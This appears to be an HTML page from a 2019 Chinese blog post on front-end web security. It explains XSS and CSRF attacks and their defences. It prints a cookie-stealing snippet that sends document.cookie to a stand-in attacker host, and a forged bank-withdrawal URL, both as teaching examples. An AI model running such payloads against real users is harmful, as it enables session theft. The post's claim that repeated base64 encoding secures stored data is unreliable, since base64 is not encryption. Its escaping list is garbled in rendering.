@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    
+    <title>WebSecurity | HengGe</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+</body></html>
+<header>
+	<a id="logo" href="/" title="HengGe">
+	<img src="/favicon.png" alt="HengGe"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://hengge1226.github.io/2019/04/17/MVC&amp;MVVM/" target="_self">MVC &amp; MVVM</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="/2019/05/07/Wedcache/" target="_self">前端缓存浅谈</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="/2019/05/11/Cookie &amp; Session &amp; Token/" target="_self">Cookie &amp; Session &amp; Token</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="/2019/05/15/JS-Inherit/" target="_self">论JS继承</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="/2019/07/21/WebSecurity/" target="_self">前端安全问题防范</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable="true"></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      WebSecurity
+    </h1>
+  
+
+	<div class="post-body mb">
+		<h2 id="Web前端安全问题防范"><a href="#Web前端安全问题防范" class="headerlink" title="Web前端安全问题防范"></a>Web前端安全问题防范</h2><p>在日常的开发当中，如果想成为一名合格的前端工程师，如果只是单单把注意力放在了界面和功能的实现，而忽略了网页开发所带来的安全问题，显然得不偿失的，保护用户的个人隐私，保护网页的安全性能是永远不能逃避的问题。</p>
+<p>本文会详细的介绍当今前端所遇到的几大安全问题以及对应的防患措施。</p>
+<h4 id="一、XSS（Cross-Site-Scripting）脚本攻击漏洞；"><a href="#一、XSS（Cross-Site-Scripting）脚本攻击漏洞；" class="headerlink" title="一、XSS（Cross-Site Scripting）脚本攻击漏洞；"></a>一、XSS（Cross-Site Scripting）脚本攻击漏洞；</h4><p> XSS是前端谈论最多的安全问题，它是通过对网页注入可执行代码且成功地被浏览器 执行，达到攻击的目的。</p>
+<p>实施XSS攻击需要具备两个条件：</p>
+<ul>
+<li><p>需要向web页面注入恶意代码；</p>
+</li>
+<li><p>这些恶意代码能够被浏览器成功的执行。</p>
+</li>
+</ul>
+<p>根据XSS攻击的效果可以分为几种类型</p>
+<p>第一、XSS反射型攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。</p>
+<p>第二、XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛等社交网站上，但OA系统，和CRM系统上也能看到它身影，比如：某CRM系统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码，当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的XSS存储型攻击。</p>
+<p>具体案例：</p>
+<ul>
+<li><p>例如在使用jsonp进行跨域请求的时候，需要携带一个参数为callback的回调函数而这个函数的名称是用户自己进行自定义的，如果callback的参数名字不是一个正常名字，而是一个script的脚本，当服务器响应的时候，网页就会自动执行这个脚本，也就是造成了XSS攻击。</p>
+</li>
+<li><p>在script脚本中还可以插入document.cooike的执行语句，来获取相对应的cooike信息，造成用户的隐私泄露。</p>
+<pre><code>var i=document.createElement(&quot;img&quot;);
+document.body.appendChild(i);
+i.src = &quot;http://www.hackerserver.com/?c=&quot; + document.cookie;
+</code></pre></li>
+</ul>
+<p>解决方法：</p>
+<ul>
+<li><p>(对返回的内容进行转译处理：</p>
+<p>​    1.把&lt;替换成&lt;</p>
+<p>​    2.把&gt;替换成&gt;</p>
+<p>​    3.把&amp;替换成&amp;</p>
+<p>​    4.把”替换成&amp;quot<em>;</em></p>
+<p>​    5.把’替换成&amp;#39<em>;</em></p>
+<p>​    )</p>
+<p>​    那样转译之后，脚本内容会转成普通的文本格式，脚本就不会执行。</p>
+</li>
+<li><p>HttpOnly 防止劫取 Cookie。浏览器将禁止页面的Javascript 访问带有 HttpOnly 属性的Cookie。</p>
+</li>
+<li><p>不要相信用户的任何输入。 对于用户的任何输入要进行检查、过滤和转义。建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。</p>
+</li>
+</ul>
+<h4 id="二、CSRF（Cross-site-request-forgery，跨站请求伪造），是通过伪造请求，冒充用户在站内进行操作。"><a href="#二、CSRF（Cross-site-request-forgery，跨站请求伪造），是通过伪造请求，冒充用户在站内进行操作。" class="headerlink" title="二、CSRF（Cross-site request forgery，跨站请求伪造），是通过伪造请求，冒充用户在站内进行操作。"></a>二、<strong>CSRF（Cross-site request forgery，跨站请求伪造）</strong>，是通过伪造请求，冒充用户在站内进行操作。</h4><p>CSRF 攻击可在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。</p>
+<p>比如说，受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求</p>
+<p><a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可使Bob把1000000 的存款转到 bob2 的账号下。</p>
+<p>通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。</p>
+<p>Mallory 可以自己发送一个请求给银行：</p>
+<p><a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。</a></p>
+<p>但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码：</p>
+<p>src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> “，</p>
+<p>并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。</p>
+<p>大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可拿到钱后逍遥法外。</p>
+<p>解决方法：</p>
+<ul>
+<li>验证 HTTP Referer 字段；根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。黑客要对网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到时，该请求的 Referer 指向黑客自己的网站，因此，要防御 CSRF 攻击，网站只需要对于每一个请求验证其 Referer 值，如是以 自己网站开头的域名，则通过，否则不通过。但是 Referer容易遭到篡改，所以不太安全。</li>
+<li>在请求地址中添加 token 并验证。</li>
+</ul>
+<p>三、本地存储数据问题</p>
+<p>很多开发者为了方便，把一些个人信息不经加密直接存到本地或者cookie，这样是非常不安全的，黑客们可以很容易就拿到用户的信息，所有在放到cookie中的信息或者localStorage里的信息要进行加密，加密可以自己定义一些加密方法或者网上寻找一些加密的插件，或者用base64进行多次加密然后再多次解码，这样就比较安全了。</p>
+
+	</div>
+	<div class="meta split">
+		
+		<time class="post-date" datetime="2019-07-21T02:50:29.000Z" itemprop="datePublished">2019-07-21</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="WebSecurity" data-title="WebSecurity" data-url="https://hengge1226.github.io/2019/07/21/WebSecurity/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewbox="0 0 100 102" preserveaspectratio="none">
+    <path d="M0 0 L50 100 L100 0 Z"/>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src alt>
+					<div class="media__body">
+						<h4>Ye.Guangheng</h4>
+						<p class="site-description">Just Share My Life</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="http://weibo.com/" target="_blank">
+				        			
+				        				<i class="iconfont icon-weibo"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+							
+							<li>
+				        		<a href="https://github.com/HENGGE1226" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+	<script type="text/javascript">
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	
+
